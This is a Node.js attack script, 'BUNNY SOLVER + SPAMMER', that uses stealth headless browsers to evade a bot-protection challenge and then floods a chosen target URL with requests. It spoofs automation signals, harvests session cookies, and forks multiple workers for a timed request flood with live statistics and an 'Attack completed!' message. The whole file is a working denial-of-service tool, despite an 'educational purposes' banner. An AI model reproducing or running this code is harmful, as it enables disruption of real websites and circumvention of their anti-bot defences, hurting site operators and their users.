const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");

puppeteer.use(StealthPlugin());

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs.join(':'),
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const cache_header = [
    'no-cache',
    'max-age=0',
    'no-cache, no-store, must-revalidate',
    'no-store',
    'no-cache, no-store, private, max-age=0'
];

const language_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-GB,en;q=0.9'
];

if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node uam.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node uam.js https://example.com 60 8 4 6\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: 8, // Luôn là 8rps sau khi solve
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2,
    solveTime: 20000 // 20s để solve bunny
};

const parsedTarget = url.parse(args.target);

class BunnySolver {
    constructor(target) {
        this.target = target;
        this.browser = null;
        this.page = null;
        this.solved = false;
        this.cookies = [];
        this.userAgent = '';
        this.sessionId = Math.random().toString(36).substring(7);
    }

    async initBrowser() {
        try {
            const response = await connect({
                headless: true, // Để hidden
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--disable-blink-features=AutomationControlled'
                ],
                turnstile: false, // Bunny không cần turnstile
                connectOption: {
                    defaultViewport: null,
                    ignoreHTTPSErrors: true
                }
            });
            
            this.browser = response.browser;
            this.page = response.page;
            
            // Random user agent
            const userAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ];
            
            await this.page.setUserAgent(userAgents[Math.floor(Math.random() * userAgents.length)]);
            
            // Override navigator properties
            await this.page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false
                });
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5]
                });
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['en-US', 'en']
                });
            });
            
            return true;
        } catch (error) {
            console.error(`[${this.sessionId}] Failed to init browser:`, error.message);
            return false;
        }
    }

    async solveBunny() {
        try {
            console.log(`[${this.sessionId}] Starting Bunny solve (20s)...`);
            
            // Navigate to target
            await this.page.goto(this.target, {
                waitUntil: 'domcontentloaded',
                timeout: 30000,
                referer: this.target
            });

            // Chờ 20s để solve bunny
            console.log(`[${this.sessionId}] Waiting 20s for Bunny challenge...`);
            await this.page.waitForTimeout(args.solveTime);

            // Check if challenge is solved
            const currentUrl = this.page.url();
            const pageContent = await this.page.content();
            
            // Lấy cookies sau khi solve
            this.cookies = await this.page.cookies();
            this.userAgent = await this.page.evaluate(() => navigator.userAgent);
            
            // Kiểm tra xem có cookies cần thiết không
            const hasImportantCookies = this.cookies.some(cookie => 
                cookie.name.includes('session') || 
                cookie.name.includes('token') || 
                cookie.name.includes('auth')
            );

            if (this.cookies.length > 0 || currentUrl.includes(this.target.replace('https://', '').replace('http://', ''))) {
                this.solved = true;
                console.log(`[${this.sessionId}] ✅ Bunny solved! Got ${this.cookies.length} cookies`);
                return true;
            } else {
                console.log(`[${this.sessionId}] ⚠️ May not be solved properly`);
                return false;
            }
            
        } catch (error) {
            console.error(`[${this.sessionId}] Solve error:`, error.message);
            return false;
        }
    }

    async startSpam() {
        if (!this.solved) {
            console.log(`[${this.sessionId}] Not solved, skipping spam`);
            return;
        }

        console.log(`[${this.sessionId}] Starting 8rps spam...`);
        
        // Chuyển đổi cookies thành string
        const cookieString = this.cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
        // Bắt đầu spam với 8rps
        this.spamInterval = setInterval(async () => {
            try {
                // Gửi 8 request mỗi giây
                for (let i = 0; i < 8; i++) {
                    await this.sendRequest(cookieString);
                }
            } catch (error) {
                // Bỏ qua lỗi
            }
        }, 1000); // 1 giây một lần
    }

    async sendRequest(cookieString) {
        try {
            // Sử dụng page.evaluate để gửi request từ trình duyệt
            await this.page.evaluate(async (target, cookie) => {
                // Gửi request bằng fetch từ trình duyệt
                try {
                    await fetch(target, {
                        method: 'GET',
                        headers: {
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-User': '?1',
                            'Upgrade-Insecure-Requests': '1',
                            'Cookie': cookie
                        },
                        mode: 'cors',
                        credentials: 'include',
                        referrer: target,
                        referrerPolicy: 'strict-origin-when-cross-origin'
                    });
                } catch (e) {
                    // Bỏ qua lỗi fetch
                }
            }, this.target, cookieString);
            
            global.successRequests = (global.successRequests || 0) + 1;
            global.totalRequests = (global.totalRequests || 0) + 1;
        } catch (error) {
            global.failedRequests = (global.failedRequests || 0) + 1;
        }
    }

    async stop() {
        if (this.spamInterval) {
            clearInterval(this.spamInterval);
        }
        if (this.page) {
            await this.page.close().catch(() => {});
        }
        if (this.browser) {
            await this.browser.close().catch(() => {});
        }
    }
}

// Worker process
if (cluster.isWorker) {
    let solver = null;
    
    process.on('message', async (msg) => {
        if (msg.type === 'start') {
            solver = new BunnySolver(args.target);
            
            // Khởi tạo trình duyệt
            const initSuccess = await solver.initBrowser();
            if (!initSuccess) {
                process.exit(1);
                return;
            }
            
            // Solve bunny trong 20s
            const solveSuccess = await solver.solveBunny();
            
            if (solveSuccess) {
                // Bắt đầu spam 8rps
                await solver.startSpam();
                
                // Gửi stats về master
                setInterval(() => {
                    process.send({
                        type: 'stats',
                        total: global.totalRequests || 0,
                        success: global.successRequests || 0,
                        failed: global.failedRequests || 0
                    });
                    global.totalRequests = 0;
                    global.successRequests = 0;
                    global.failedRequests = 0;
                }, 1000);
            } else {
                console.log(`[${solver.sessionId}] Failed to solve, exiting...`);
                await solver.stop();
                process.exit(1);
            }
        }
        
        if (msg.type === 'stop') {
            if (solver) {
                await solver.stop();
            }
            process.exit(0);
        }
    });
}

// Master process
if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m🐰 BUNNY SOLVER + SPAMMER 🐰\x1b[0m");
    console.log("\x1b[33mONLY FOR EDUCATIONAL PURPOSES!\x1b[0m\n");
    console.log(`\x1b[36mTarget: ${args.target}\x1b[0m`);
    console.log(`\x1b[36mTime: ${args.time}s\x1b[0m`);
    console.log(`\x1b[36mRate: 8rps (after 20s solve)\x1b[0m`);
    console.log(`\x1b[36mThreads: ${args.threads}\x1b[0m\n`);
    
    global.totalRequests = 0;
    global.successRequests = 0;
    global.failedRequests = 0;
    global.startTime = Date.now();
    
    // Tạo workers
    const workers = [];
    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork();
        workers.push(worker);
        
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                global.totalRequests += msg.total || 0;
                global.successRequests += msg.success || 0;
                global.failedRequests += msg.failed || 0;
            }
        });
    }
    
    // Bắt đầu tất cả workers
    setTimeout(() => {
        workers.forEach(worker => {
            worker.send({ type: 'start' });
        });
    }, 1000);
    
    // Hiển thị stats
    const statsInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
        const remaining = Math.max(0, args.time - elapsed);
        
        console.clear();
        console.log("\x1b[35m🐰 BUNNY SOLVER + SPAMMER 🐰\x1b[0m");
        console.log(`\x1b[36mTarget: ${args.target}\x1b[0m`);
        console.log(`\x1b[36mElapsed: ${elapsed}s / ${args.time}s\x1b[0m`);
        console.log(`\x1b[36mRemaining: ${remaining}s\x1b[0m`);
        console.log(`\x1b[36mThreads: ${args.threads} active\x1b[0m\n`);
        
        console.log("\x1b[33m📊 STATISTICS:\x1b[0m");
        console.log(`   \x1b[32m✅ Success: ${global.successRequests || 0}\x1b[0m`);
        console.log(`   \x1b[31m❌ Failed: ${global.failedRequests || 0}\x1b[0m`);
        console.log(`   \x1b[36m📈 Total: ${global.totalRequests || 0}\x1b[0m`);
        
        if (elapsed > 0) {
            const rps = (global.totalRequests || 0) / elapsed;
            console.log(`   \x1b[33m⚡ Speed: ${rps.toFixed(2)} req/s\x1b[0m`);
        }
        
        // Hiển thị progress bar
        if (args.time > 0) {
            const progress = Math.min(100, (elapsed / args.time) * 100);
            const barWidth = 30;
            const filled = Math.floor(barWidth * progress / 100);
            const bar = '█'.repeat(filled) + '░'.repeat(barWidth - filled);
            console.log(`\n   \x1b[36m[${bar}] ${progress.toFixed(1)}%\x1b[0m`);
        }
        
        // Hiển thị trạng thái solve
        if (elapsed < 20) {
            console.log(`\n   \x1b[33m🔍 Solving Bunny challenge... (${20 - elapsed}s remaining)\x1b[0m`);
        } else {
            console.log(`\n   \x1b[32m✅ Bunny solved! Spamming at 8rps...\x1b[0m`);
        }
    }, 1000);
    
    // Dừng sau thời gian chỉ định
    setTimeout(() => {
        clearInterval(statsInterval);
        
        console.log("\n\x1b[32m🎯 Attack completed!\x1b[0m");
        console.log("\x1b[36m📊 FINAL STATISTICS:\x1b[0m");
        console.log(`   Total requests: ${global.totalRequests}`);
        console.log(`   Success: ${global.successRequests}`);
        console.log(`   Failed: ${global.failedRequests}`);
        console.log(`   Duration: ${args.time}s`);
        console.log(`   Average RPS: ${(global.totalRequests / args.time).toFixed(2)}`);
        
        // Dừng tất cả workers
        workers.forEach(worker => {
            worker.send({ type: 'stop' });
        });
        
        setTimeout(() => {
            process.exit(0);
        }, 2000);
    }, args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
